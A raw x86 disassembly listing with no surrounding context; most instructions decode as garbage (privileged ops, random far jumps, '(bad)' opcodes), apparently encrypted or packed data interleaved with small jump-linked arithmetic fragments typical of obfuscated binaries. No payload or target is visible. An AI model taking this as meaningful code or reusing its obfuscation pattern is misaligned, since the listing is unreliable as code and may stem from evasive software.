  401931:	jmp    0x4018d3
  401933:	mov    ecx,0x836eec30
  401938:	stos   DWORD PTR es:[edi],eax
  401939:	mov    ebp,0x3c494ebe
  40193e:	inc    ecx
  40193f:	jno    0x4018df
  401941:	ins    BYTE PTR es:[edi],dx
  401942:	sub    DWORD PTR [edi+ebx*2+0x5c],esp
  401946:	std    
  401947:	dec    eax
  401948:	xchg   esi,eax
  401949:	lods   al,BYTE PTR ds:[esi]
  40194a:	out    0x3e,al
  40194c:	dec    ebx
  40194d:	int    0xfd
  40194f:	cli    
  401950:	xchg   ebx,esi
  401952:	fisttp QWORD PTR [ecx]
  401954:	pop    ds
  401955:	fdivr  QWORD PTR [ebx]
  401957:	enter  0xc315,0x96
  40195b:	mov    eax,0x15ad71db
  401960:	cmp    eax,0xae05bdaf
  401965:	pop    esp
  401966:	je     0x40199b
  401968:	xor    DWORD PTR [esi+0xa],0xffffffd7
  40196c:	aas    
  40196d:	shl    BYTE PTR [edx+0x28af48f4],0x82
  401974:	xchg   esp,eax
  401975:	stos   DWORD PTR es:[edi],eax
  401976:	les    edi,FWORD PTR [edx]
  401978:	adc    eax,0x2ba1f3bb
  40197d:	enter  0x5c71,0x6f
  401981:	sbb    eax,0x4370f3cc
  401986:	mov    edi,0x45162062
  40198b:	and    DWORD PTR [ebp-0xa],eax
  40198e:	retf   
  40198f:	fmul   QWORD PTR [ecx+eiz*4]
  401992:	sti    
  401993:	scas   eax,DWORD PTR es:[edi]
  401994:	cmp    eax,0x16d34e7e
  401999:	neg    BYTE PTR [edi-0x7d910097]
  40199f:	out    0x4d,eax
  4019a1:	xor    DWORD PTR [edi-0x215e06be],eax
  4019a7:	adc    dl,BYTE PTR [edi+0x1f74063e]
  4019ad:	in     al,dx
  4019ae:	into   
  4019af:	fs pop eax
  4019b1:	in     eax,dx
  4019b2:	aaa    
  4019b3:	icebp  
  4019b4:	dec    eax
  4019b5:	pop    edi
  4019b6:	sub    DWORD PTR [eax],ebx
  4019b8:	mov    esi,0x7f939128
  4019bd:	sbb    BYTE PTR [ebp+0x9],cl
  4019c0:	sub    DWORD PTR [eax+0x5206484b],ecx
  4019c6:	mov    ebx,0xc97049e7
  4019cb:	sbb    al,0x9a
  4019cd:	pop    ds
  4019ce:	test   al,0x33
  4019d0:	mov    bl,0xb8
  4019d2:	ds es xchg esi,eax
  4019d5:	or     ah,BYTE PTR [edi]
  4019d7:	jne    0x4019ea
  4019d9:	in     eax,dx
  4019da:	ins    BYTE PTR es:[edi],dx
  4019db:	mov    ah,0x39
  4019dd:	xor    BYTE PTR [eax+0xb2fd601],0xda
  4019e4:	inc    ebp
  4019e5:	xlat   BYTE PTR ds:[ebx]
  4019e6:	jne    0x40197c
  4019e8:	xor    esp,esp
  4019ea:	pop    ebx
  4019eb:	repz sbb al,0x8a
  4019ee:	hlt    
  4019ef:	push   0xe03cd637
  4019f4:	mov    ebx,0xc1348310
  4019f9:	push   ecx
  4019fa:	jmp    0x401a7b
  4019fc:	add    BYTE PTR [edx+0x431c2be9],cl
  401a02:	inc    esi
  401a03:	cld    
  401a04:	ins    BYTE PTR es:[edi],dx
  401a05:	and    eax,DWORD PTR [edi+ebp*2-0x8]
  401a09:	mov    edx,0xdab5637c
  401a0e:	lods   eax,DWORD PTR ds:[esi]
  401a0f:	scas   eax,DWORD PTR es:[edi]
  401a10:	push   eax
  401a11:	mov    esi,0x6c668f6a
  401a16:	adc    BYTE PTR [ebp+esi*2+0x20],dh
  401a1a:	cmc    
  401a1b:	wrmsr  
  401a1d:	and    edx,DWORD PTR [esi]
  401a1f:	jge    0x4019d5
  401a21:	cmp    DWORD PTR [edi+edx*4+0x1a],eax
  401a25:	cmp    al,0x72
  401a27:	inc    ecx
  401a28:	pushf  
  401a29:	out    0x14,al
  401a2b:	call   FWORD PTR [edx+0x4a]
  401a2e:	daa    
  401a2f:	jmp    0x6877164a
  401a34:	inc    ebx
  401a35:	mov    dh,BYTE PTR [edi-0x2e]
  401a38:	test   DWORD PTR [eax],esp
  401a3a:	sbb    edi,edx
  401a3c:	test   eax,esp
  401a3e:	inc    ebp
  401a3f:	inc    ebx
  401a40:	push   esp
  401a41:	cmc    
  401a42:	jp     0x401ab9
  401a44:	jns    0x401a99
  401a46:	push   edi
  401a47:	add    bh,ch
  401a49:	mov    fs,WORD PTR [eax]
  401a4b:	sub    eax,0xe7154cc6
  401a50:	jmp    0x6ce3edad
  401a55:	jmp    0x695c:0xf781ae87
  401a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a5d:	dec    edi
  401a5e:	(bad)  
  401a5f:	(bad)
  401a62:	mov    eax,DWORD PTR [ebp+0x8]
  401a65:	and    DWORD PTR ds:0x4345cf,0x0
  401a6f:	mov    ecx,DWORD PTR ds:0x4345cf
  401a75:	inc    ecx
  401a76:	mov    DWORD PTR ds:0x4345cf,ecx
  401a7c:	cmp    DWORD PTR ds:0x4345cf,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x4345cf,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x4345cf
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x4345cf,ecx
  401aae:	cmp    DWORD PTR ds:0x4345cf,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x37d6485e
  401ae8:	jnp    0x401b1b
  401aea:	push   edx
  401aeb:	add    al,0x7e
  401aed:	jle    0x401aa4
  401aef:	jg     0x401b6f
  401af1:	jle    0x401ae4
  401af3:	push   ebx
  401af4:	pop    edi
  401af5:	call   0xa202:0xb4eca344
  401afc:	mov    eax,0x5cb98634
  401b01:	mov    ecx,gs
  401b03:	and    DWORD PTR [esi+ebx*2],ecx
  401b06:	dec    ecx
  401b07:	(bad)  
  401b09:	pop    esp
  401b0a:	mov    dl,0x8b
  401b0c:	fs jne 0x401aae
  401b0f:	push   esi
  401b10:	leave  
  401b11:	jle    0x401aaf
  401b13:	sbb    BYTE PTR [esi-0x42ac3887],dh
  401b19:	cs jle 0x401b3d
  401b1c:	pusha  
  401b1d:	lods   eax,DWORD PTR ds:[esi]
  401b1e:	or     al,BYTE PTR [esi+eax*1]
  401b21:	cs xor eax,0xd0646b9e
  401b27:	xchg   ecx,eax
  401b28:	imul   ecx,DWORD PTR cs:[edx+0x5c48aeed],0xffffff9e
  401b30:	fiadd  WORD PTR [edx]
  401b32:	cdq    
  401b33:	inc    esi
  401b34:	jnp    0x401b3e
  401b36:	test   al,0xc8
  401b38:	pop    ds
  401b39:	sub    esi,DWORD PTR [eax+0x1f191cab]
  401b3f:	jno    0x401b2e
  401b41:	(bad)  
  401b42:	sbb    DWORD PTR [ecx+0x29c930e5],edi
  401b48:	inc    ebp
  401b49:	mov    dh,0xe0
  401b4b:	test   eax,0xbaada95d
  401b50:	ins    BYTE PTR es:[edi],dx
  401b51:	fbstp  TBYTE PTR [ecx]
  401b53:	mov    DWORD PTR [ebp+0x44],ebx
  401b56:	sbb    DWORD PTR [eax],esp
  401b58:	xchg   esi,eax
  401b59:	icebp  
  401b5a:	repz (bad) 
  401b5c:	pop    ecx
  401b5d:	shl    DWORD PTR [ebp+0x45],0x31
  401b61:	idiv   BYTE PTR [edi+edi*4]
  401b64:	pop    edx
  401b65:	cmc    
  401b66:	push   ds
  401b67:	and    BYTE PTR [esi+0x44],0xe3
  401b6b:	pop    edx
  401b6c:	cmp    BYTE PTR [edi-0xe],dh
  401b6f:	int3   
  401b70:	inc    edi
  401b71:	fisub  DWORD PTR [ebp+0x45f13f90]
  401b77:	adc    BYTE PTR [edi+eax*4-0x1ca7a5d2],bh
  401b7e:	pop    ebp
  401b7f:	leave  
  401b80:	frstpm(287 only) 
  401b82:	sbb    bl,bh
  401b84:	fistp  WORD PTR [edi+0x3921239f]
  401b8a:	fwait
  401b8b:	test   BYTE PTR [eax+0x1c],ch
  401b8e:	(bad)  
  401b8f:	(bad)
  401b92:	sbb    ch,ah
  401b94:	pop    ss
  401b95:	sar    BYTE PTR [ecx-0x5283b477],cl
  401b9b:	push   0xffffffcc
  401b9d:	int    0x88
  401b9f:	rcr    DWORD PTR [ebp+0x32ad0954],0xe2
  401ba6:	or     eax,DWORD PTR [eax]
  401ba8:	sbb    edi,DWORD PTR [edi-0x67]
  401bab:	add    al,0xde
  401bad:	mov    ebx,DWORD PTR [ebp+0x7f923f88]
  401bb3:	dec    edx
  401bb4:	loopne 0x401bed
  401bb6:	sub    cl,BYTE PTR [esi+0x30]
  401bb9:	jae    0x401c02
  401bbb:	std    
  401bbc:	aas    
  401bbd:	pushf  
  401bbe:	adc    eax,0x68b06504
  401bc3:	xchg   edi,eax
  401bc4:	mov    cl,0x97
  401bc6:	loope  0x401bbd
  401bc8:	fs daa 
  401bca:	jmp    0xa328:0x5ab68e03
  401bd1:	cld    
  401bd2:	sub    ch,BYTE PTR [edi]
  401bd4:	cdq    
  401bd5:	outs   dx,DWORD PTR ds:[esi]
  401bd6:	xor    eax,0xcce09ab2
  401bdb:	sbb    BYTE PTR [esi-0x16],ch
  401bde:	jp     0x401bbe
  401be0:	popf   
  401be1:	into   
  401be2:	(bad)  
  401be3:	test   DWORD PTR [eax],0x5d8016ef
  401be9:	inc    edx
  401bea:	sbb    bh,BYTE PTR [ebx-0x2f]
  401bed:	in     eax,dx
  401bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bef:	adc    BYTE PTR [ebx+0x7e420794],dl
  401bf5:	imul   esp,DWORD PTR [ecx],0xffffffab
  401bf8:	stc    
  401bf9:	mov    cl,BYTE PTR [ecx-0x374a0a48]
  401bff:	ja     0x401c42
  401c01:	push   ss
  401c02:	push   ecx
  401c03:	test   DWORD PTR ds:0x4c9ffd1e,ebp
  401c09:	dec    edx
  401c0a:	bound  edx,QWORD PTR [edi+0x60f91275]
  401c10:	xor    esp,DWORD PTR [ecx+0x78bd196]
  401c16:	dec    esi
  401c17:	fidivr WORD PTR [si+0x275d]
  401c1c:	dec    ebx
  401c1d:	int3   
  401c1e:	xchg   esi,eax
  401c1f:	hlt    
  401c20:	or     eax,0xe23ccbb8
  401c25:	inc    edx
  401c26:	icebp  
  401c27:	arpl   WORD PTR [ebx],sp
  401c29:	into   
  401c2a:	xchg   esi,eax
  401c2b:	mov    ecx,0xb97e76
  401c30:	mov    dl,0x72
  401c32:	loope  0x401be4
  401c34:	or     ebx,DWORD PTR [ecx-0x3e]
  401c37:	xor    BYTE PTR [edx+0x2e],bh
  401c3a:	addr16 dec edx
  401c3c:	ins    DWORD PTR es:[edi],dx
  401c3d:	push   ss
  401c3e:	jl     0x401bc8
  401c40:	or     eax,0xbea4e3
  401c45:	mov    ds:0x614a149,al
  401c4a:	inc    esi
  401c4b:	repnz icebp 
  401c4d:	add    bl,bh
  401c4f:	dec    ebx
  401c50:	jg     0x401bfb
  401c52:	out    0x4b,eax
  401c54:	mov    dh,BYTE PTR [edx-0x55]
  401c57:	jb     0x401c3e
  401c59:	cmp    al,0xa1
  401c5b:	sti    
  401c5c:	jecxz  0x401be9
  401c5e:	ins    DWORD PTR es:[edi],dx
  401c5f:	hlt    
  401c60:	out    dx,eax
  401c61:	data16 (bad) 
  401c63:	pop    ebx
  401c64:	pop    eax
  401c65:	sbb    DWORD PTR [edi+edi*2],esi
  401c68:	push   ebx
  401c69:	rcr    ch,1
  401c6b:	or     DWORD PTR [esi+0x4f39f551],ebx
  401c71:	or     BYTE PTR [ebp+0x4dc2087],bl
  401c77:	sbb    ch,BYTE PTR [ecx+0x7c]
  401c7a:	test   ebp,edx
  401c7c:	pop    ebx
  401c7d:	idiv   BYTE PTR [bp+di-0x4f]
  401c81:	and    BYTE PTR [ebx-0x5c],ah
  401c84:	test   BYTE PTR [esi-0x6f],ah
  401c87:	into   
  401c88:	imul   eax,edi,0x1f7d4c2f
  401c8e:	inc    edx
  401c8f:	js     0x401c58
  401c91:	and    ebp,ecx
  401c93:	outs   dx,DWORD PTR ds:[esi]
  401c94:	add    eax,0x45db06cf
  401c99:	xchg   ecx,eax
  401c9a:	push   esi
  401c9b:	jo     0x401cc9
  401c9d:	rcl    BYTE PTR [esi+0x12],0x74
  401ca1:	sti    
  401ca2:	dec    eax
  401ca3:	in     eax,0xbc
  401ca5:	add    eax,0xa11f24ef
  401caa:	ror    BYTE PTR [ebx+0x41],cl
  401cad:	add    BYTE PTR [ebx+0x4d8b6600],cl
  401cb3:	cld    
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	add    ah,BYTE PTR [eax-0x55]
  401ccd:	fimul  DWORD PTR [ecx-0x4a8181fa]
  401cd3:	jg     0x401d53
  401cd5:	jle    0x401c5e
  401cd7:	jp     0x401cf5
  401cd9:	mov    dh,0x3
  401cdb:	dec    edi
  401cdc:	gs sti 
  401cde:	shl    edx,cl
  401ce0:	inc    edi
  401ce1:	add    bl,ah
  401ce3:	in     al,0xd6
  401ce5:	mov    ecx,0x18e973d
  401cea:	ja     0x401d41
  401cec:	lahf   
  401ced:	rcl    BYTE PTR [edx+0x48424e98],1
  401cf3:	daa    
  401cf4:	mov    cl,0xe7
  401cf6:	imul   DWORD PTR [eax+ebp*8+0x497db7f3]
  401cfd:	mov    ds:0x5f629030,al
  401d02:	test   eax,0x9838aa86
  401d07:	jno    0x401d0a
  401d09:	or     DWORD PTR [esi],edx
  401d0b:	in     al,dx
  401d0c:	jo     0x9b654c09
  401d12:	xor    BYTE PTR [ebp-0x711c2961],cl
  401d18:	sub    DWORD PTR fs:[esi+0x64],ebp
  401d1c:	sub    esp,DWORD PTR [ebp-0x74459d74]
  401d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d23:	jge    0x401d62
  401d25:	xchg   BYTE PTR [ebp+0xc0025f5],bl
  401d2b:	mov    al,0x68
  401d2d:	sub    BYTE PTR ds:0xc61782e4,cl
  401d33:	dec    edx
  401d34:	je     0x401d04
  401d36:	jo     0x401cc9
  401d38:	mov    ah,0xd
  401d3a:	xchg   ecx,eax
  401d3b:	das    
  401d3c:	rcl    BYTE PTR [ebp+0x3b],0xbe
  401d40:	aad    0xbd
  401d42:	int    0x11
  401d44:	in     eax,0x44
  401d46:	pop    eax
  401d47:	fwait
  401d48:	mov    edx,0x9f171685
  401d4d:	ds xor eax,0x743199f7
  401d53:	inc    edi
  401d54:	iret   
  401d55:	aas    
  401d56:	int    0xd5
  401d58:	lds    ebx,FWORD PTR [edx]
  401d5a:	pushf  
  401d5b:	call   0x823ecdc4
  401d60:	dec    esp
  401d61:	pop    ss
  401d62:	mov    al,ds:0x8f12d8f1
  401d67:	repnz or eax,0xeacc1bc0
  401d6d:	adc    cl,BYTE PTR [edi+0x10]
  401d70:	das    
  401d71:	cmp    esi,DWORD PTR [ebp+0x622fe739]
  401d77:	mov    al,ds:0x7db04a9a
  401d7c:	out    dx,eax
  401d7d:	adc    edx,DWORD PTR es:[ebx]
  401d80:	xlat   BYTE PTR ds:[ebx]
  401d81:	and    ecx,DWORD PTR [edx]
  401d83:	sub    eax,0xffffffd0
  401d86:	bound  esp,QWORD PTR es:[edx+0x5]
  401d8a:	shr    BYTE PTR [ecx-0x7fd7052f],cl
  401d90:	stos   DWORD PTR es:[edi],eax
  401d91:	pop    ss
  401d92:	and    BYTE PTR [ecx-0x1b],cl
  401d95:	push   esp
  401d96:	mov    ds:0x1c34056d,eax
  401d9b:	xchg   edx,eax
  401d9c:	pushf  
  401d9d:	xchg   ebx,eax
  401d9e:	out    0xd1,eax
  401da0:	int3   
  401da1:	sbb    al,0x87
  401da3:	shr    DWORD PTR [eax-0x79234260],1
  401da9:	jae    0x401d37
  401dab:	sbb    BYTE PTR [esi-0x54],dl
  401dae:	test   BYTE PTR [ebx+eax*1],bl
  401db1:	test   DWORD PTR [eax-0x3e],esi
  401db4:	int3   
  401db5:	pusha  
  401db6:	mov    ch,0x38
  401db8:	pop    edi
  401db9:	inc    esi
  401dba:	fld    DWORD PTR [edi]
  401dbc:	call   0xff3333b5
  401dc1:	or     cl,BYTE PTR [ebx]
  401dc3:	jp     0x401dfa
  401dc5:	add    eax,0x9e0b64b6
  401dca:	loope  0x401d74
  401dcc:	inc    ecx
  401dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dce:	xor    edi,DWORD PTR [ebp+0x66fa3f92]
  401dd4:	aam    0xa5
  401dd6:	(bad)  
  401dd7:	int    0x80
  401dd9:	adc    ebp,DWORD PTR [ebp+0x4f60c4fe]
  401ddf:	(bad)  
  401de0:	(bad)  
  401de1:	retf   0x4088
  401de4:	out    0xbe,al
  401de6:	sub    al,0x73
  401de8:	dec    esp
  401de9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dea:	push   esi
  401deb:	mov    bl,0xb3
  401ded:	xor    BYTE PTR [edx+0x526fb85c],ch
  401df3:	test   al,0xe6
  401df5:	inc    esp
  401df6:	stos   DWORD PTR es:[edi],eax
  401df7:	test   al,0x2f
  401df9:	shr    DWORD PTR [edi+esi*1-0x3c],cl
  401dfd:	jmp    0x11c7:0x5a738b08
  401e04:	retf   
  401e05:	pop    esp
  401e06:	or     BYTE PTR [edx-0x2e],bl
  401e09:	cmp    DWORD PTR [ebp-0xc],edx
  401e0c:	jmp    0x3d69:0x7361438e
  401e13:	push   ecx
  401e14:	fsubr  DWORD PTR [edi+eiz*1-0x36]
  401e18:	popf   
  401e19:	cmp    edi,DWORD PTR [ebx-0x50f755ff]
  401e1f:	push   0xf7b55d62
  401e24:	xchg   edx,eax
  401e25:	adc    eax,0xd09dbbe0
  401e2a:	call   0xd1f818a9
  401e2f:	push   edi
  401e30:	xchg   DWORD PTR [ecx],edx
  401e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e33:	(bad)  [edx+0x6a]
  401e36:	push   esi
  401e37:	xor    eax,0x16fd5a53
  401e3c:	enter  0xa0d1,0x20
  401e40:	popf   
  401e41:	(bad)  
  401e42:	fimul  WORD PTR [edi-0x6e]
  401e45:	dec    edx
  401e46:	sbb    al,BYTE PTR [eax+0x26]
  401e49:	push   cs
  401e4a:	add    bh,BYTE PTR [ebp+ecx*1-0x19b3b602]
  401e51:	fucomp st(0)
  401e53:	dec    esi
  401e54:	sbb    al,0x7f
  401e56:	add    BYTE PTR [eax],bh
  401e58:	add    BYTE PTR [ecx+edx*1+0x45],ch
  401e5c:	call   0xb4fab3cb
  401e61:	dec    esp
  401e62:	and    BYTE PTR [edi+ebx*1],bl
  401e65:	cld    
  401e66:	pop    esp
  401e67:	in     eax,0xaa
  401e69:	adc    BYTE PTR [ebp+ebp*8+0x38],cl
  401e6d:	inc    eax
  401e6e:	push   ebx
  401e6f:	test   DWORD PTR [ecx-0x33],0xe1abab7d
  401e76:	adc    BYTE PTR [ecx],al
  401e78:	add    DWORD PTR [edx-0x50],ebx
  401e7b:	imul   eax,DWORD PTR [edx],0xffffffb7
  401e7e:	test   BYTE PTR [ecx],dh
  401e80:	xchg   edi,eax
  401e81:	adc    ebx,DWORD PTR [ebx+eiz*1-0xf]
  401e85:	(bad)
  401e88:	push   edx
  401e89:	scas   al,BYTE PTR es:[edi]
  401e8a:	pop    ss
  401e8b:	stos   DWORD PTR es:[edi],eax
  401e8c:	in     eax,dx
  401e8d:	mov    DWORD PTR [ebp-0x18],ecx
  401e90:	mov    eax,DWORD PTR [ebp+0xc]
  401e93:	mov    ecx,DWORD PTR [ebp+0xc]
  401e96:	xor    eax,esi
  401e98:	add    eax,eax
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	cs ss dec ebp
  401eb2:	jmp    0x401e74
  401eb4:	add    BYTE PTR [esi+0x7e],bh
  401eb7:	mov    ch,0x7f
  401eb9:	jle    0x401f39
  401ebb:	inc    esp
  401ebc:	adc    al,0xd9
  401ebe:	xor    BYTE PTR [edi+0x4c],bl
  401ec1:	pop    ebp
  401ec2:	ror    BYTE PTR [ebp-0x593d4280],0x42
  401ec9:	mov    eax,esi
  401ecb:	leave  
  401ecc:	mov    eax,ds:0x1bd3ae22
  401ed1:	pop    ebp
  401ed2:	mov    DWORD PTR [edi-0xe],eax
  401ed5:	ss int3 
  401ed7:	out    dx,eax
  401ed8:	xchg   DWORD PTR [edx+0x29],ebp
  401edb:	inc    ecx
  401edc:	test   BYTE PTR [ebp+0x17803fa0],bl
  401ee2:	ins    BYTE PTR es:[edi],dx
  401ee3:	dec    edx
  401ee4:	test   BYTE PTR [esi],0x74
  401ee7:	cdq    
  401ee8:	xchg   edx,eax
  401ee9:	pop    esp
  401eea:	mov    edx,edx
  401eec:	dec    edi
  401eed:	pop    ss
  401eee:	call   0x58b1:0x2c07689e
  401ef5:	mov    bh,0x65
  401ef7:	cld    
  401ef8:	xor    dh,dh
  401efa:	out    dx,eax
  401efb:	test   BYTE PTR [eax-0x50],dl
  401efe:	daa    
  401eff:	enter  0xa195,0xd
  401f03:	xlat   BYTE PTR ds:[ebx]
  401f04:	sbb    dl,BYTE PTR [edi]
  401f06:	dec    ebx
  401f07:	push   ecx
  401f08:	and    cl,dh
  401f0a:	mov    ah,0x3d
  401f0c:	push   edx
  401f0d:	mov    eax,0x6e18a003
  401f12:	inc    ebx
  401f13:	mov    edx,0x37506de8
  401f18:	mov    eax,ds:0xbcd72815
  401f1d:	out    dx,al
  401f1e:	and    edi,ebp
  401f20:	out    dx,eax
  401f21:	sar    DWORD PTR [edx],0x74
  401f24:	fdivr  DWORD PTR [edi+edi*1-0x7d07ebf7]
  401f2b:	cmp    dh,BYTE PTR [edx]
  401f2d:	sbb    BYTE PTR [edx],dh
  401f2f:	push   ebx
  401f30:	enter  0xc198,0xfd
  401f34:	ins    DWORD PTR es:[edi],dx
  401f35:	adc    bl,0xa6
  401f38:	call   0x46c9:0x836fb455
  401f3f:	retf   0xcbd0
  401f42:	jmp    0x401f88
  401f44:	sbb    BYTE PTR [ecx],ch
  401f46:	xchg   esi,eax
  401f47:	xor    esp,0x56f43296
  401f4d:	popf   
  401f4e:	sbb    edi,DWORD PTR [ebp-0x50]
  401f51:	add    al,0x6d
  401f53:	dec    esp
  401f54:	sbb    ch,BYTE PTR [esi-0x5e]
  401f57:	pop    eax
  401f58:	adc    eax,DWORD PTR [eax-0x52]
  401f5b:	pop    edx
  401f5c:	mov    ch,0x33
  401f5e:	fnstcw WORD PTR [eax+0x4c3d2397]
  401f64:	imul   ebx,DWORD PTR [edi+0x484810f8],0xd6829809
  401f6e:	iret   
  401f6f:	out    dx,al
  401f70:	dec    ebp
  401f72:	pop    ebp
  401f73:	popa   
  401f74:	in     al,dx
  401f75:	imul   ebp,DWORD PTR [edi-0x62],0xffffffc6
  401f79:	xor    BYTE PTR [edx+0x22],dl
  401f7c:	jecxz  0x401f90
  401f7e:	or     esp,DWORD PTR [edx-0x5]
  401f81:	pushf  
  401f82:	repnz outs dx,DWORD PTR ds:[esi]
  401f84:	cmp    al,0x55
  401f86:	xchg   edi,eax
  401f87:	sub    BYTE PTR ds:0xb48999fa,ch
  401f8d:	xor    ch,BYTE PTR [ecx-0x99b3c91]
  401f93:	dec    eax
  401f94:	adc    bl,bl
  401f96:	mov    ebp,?
  401f98:	in     eax,dx
  401f99:	pop    ebp
  401f9a:	cmp    esi,ecx
  401f9c:	stos   BYTE PTR es:[edi],al
  401f9d:	and    BYTE PTR [esi],dl
  401f9f:	sbb    eax,0xbc31b762
  401fa4:	bnd ret 0x886d
  401fa8:	mov    bh,0x77
  401faa:	std    
  401fab:	leave  
  401fac:	shr    BYTE PTR [ecx],1
  401fae:	adc    ch,BYTE PTR [eax+0x36]
  401fb1:	jmp    0x401ffc
  401fb3:	jbe    0x401fac
  401fb5:	mov    DWORD PTR [edx+0xed827fa],esp
  401fbb:	lahf   
  401fbc:	and    eax,0x7ecd7c24
  401fc1:	cmp    BYTE PTR [edi],cl
  401fc3:	jmp    0x401fc1
  401fc5:	les    edi,FWORD PTR ds:0x1085c543
  401fcb:	outs   dx,DWORD PTR ds:[esi]
  401fcc:	xor    al,0x58
  401fce:	push   ds
  401fcf:	pop    edi
  401fd0:	adc    ecx,DWORD PTR [edx-0x72]
  401fd3:	xor    al,0x1d
  401fd5:	sbb    eax,0x3e3a3aaa
  401fda:	xchg   ebx,eax
  401fdb:	jns    0x402046
  401fdd:	mov    ah,0x6d
  401fdf:	loope  0x401f98
  401fe1:	sbb    al,0x66
  401fe3:	pushf  
  401fe4:	mov    ebp,DWORD PTR ds:0xc8f3f0d2
  401fea:	div    eax
  401fec:	mov    eax,ds:0xf5bf0638
  401ff1:	js     0x402001
  401ff3:	mov    eax,0x1059830b
  401ff8:	fild   WORD PTR [eax-0x1a]
  401ffb:	(bad)  
  401ffc:	cli    
  401ffd:	inc    esp
  401ffe:	ss jmp 0x401fb2
  402001:	ret    
  402002:	into   
  402003:	fsubr  QWORD PTR [edx-0x3b]
  402006:	push   0xffffffda
  402008:	push   ebp
  402009:	xor    ebx,DWORD PTR [ebx+0x6]
  40200c:	retf   0x52aa
  40200f:	test   al,0xf4
  402011:	sub    eax,0xeda65966
  402016:	pop    esi
  402017:	fiadd  WORD PTR [edi]
  402019:	xor    BYTE PTR [edx],ah
  40201b:	enter  0xb221,0x60
  40201f:	test   DWORD PTR [eax+0x46af176],0x3b2cb0f4
  402029:	adc    al,0x52
  40202b:	retf   0x12c
  40202e:	out    dx,al
  40202f:	mov    ebx,esi
  402031:	mov    al,ds:0x4869a506
  402036:	aaa    
  402037:	rcl    DWORD PTR [ebp+0x4a],cl
  40203a:	adc    BYTE PTR [esi+0x1b],dh
  40203d:	mov    cl,0xb0
  40203f:	pop    esi
  402040:	mov    gs,ebx
  402042:	push   ds
  402043:	dec    ebp
  402044:	sar    BYTE PTR [ebx-0x629c1616],0x7b
  40204b:	jmp    0xedd61414
  402050:	mov    dl,0xe3
  402052:	in     eax,dx
  402053:	nop
  402054:	jl     0x402084
  402056:	scas   eax,DWORD PTR es:[edi]
  402057:	mov    esp,0x5c8c6abe
  40205c:	popf   
  40205d:	fild   DWORD PTR [edx+0x4f]
  402060:	pop    ds
  402061:	jbe    0x4020ae
  402063:	mov    edx,0xb28d291d
  402068:	push   ds
  402069:	mov    bl,BYTE PTR [esi+0x4d]
  40206c:	and    al,0xad
  40206e:	mov    esi,DWORD PTR [eax-0x1c]
  402071:	add    DWORD PTR [esi-0x75],esp
  402074:	inc    ebp
  402075:	cld    
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [eax+0x7fe6a7cb],esp
  4020a6:	add    bh,BYTE PTR [esi+0x7e]
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	mov    eax,ds:0x87b91e59
  4020b2:	gs mov cl,0x22
  4020b5:	mov    ds:0x93945f6b,eax
  4020ba:	or     DWORD PTR [ebp+edx*1-0x7949e0f7],eax
  4020c1:	lea    esi,[esi]
  4020c3:	mov    eax,0xc657e78b
  4020c8:	gs pushf 
  4020ca:	fiadd  WORD PTR [ebx]
  4020cc:	pushf  
  4020cd:	mov    BYTE PTR [edi],bl
  4020cf:	mov    eax,ds:0x124419f0
  4020d4:	into   
  4020d5:	into   
  4020d6:	iret   
  4020d7:	push   eax
  4020d8:	mov    edx,cs
  4020da:	ret    0xbcb2
  4020dd:	jnp    0x402098
  4020df:	and    DWORD PTR [esi+0x47],ebx
  4020e2:	adc    eax,0xf5a5e89e
  4020e7:	rcr    eax,0x45
  4020ea:	mov    edx,0x2eed1630
  4020ef:	push   0x32
  4020f1:	mov    BYTE PTR [eax+0x3eb4da8c],dh
  4020f7:	jl     0x4020ea
  4020f9:	std    
  4020fa:	cmp    DWORD PTR [ebx-0x362d49e7],esp
  402100:	call   0x7e38a68d
  402105:	dec    ecx
  402106:	imul   edx,DWORD PTR [esi-0x6b],0xda18b709
  40210d:	int3   
  40210e:	dec    ebx
  40210f:	push   0xffffffb3
  402111:	push   es
  402112:	xchg   esi,eax
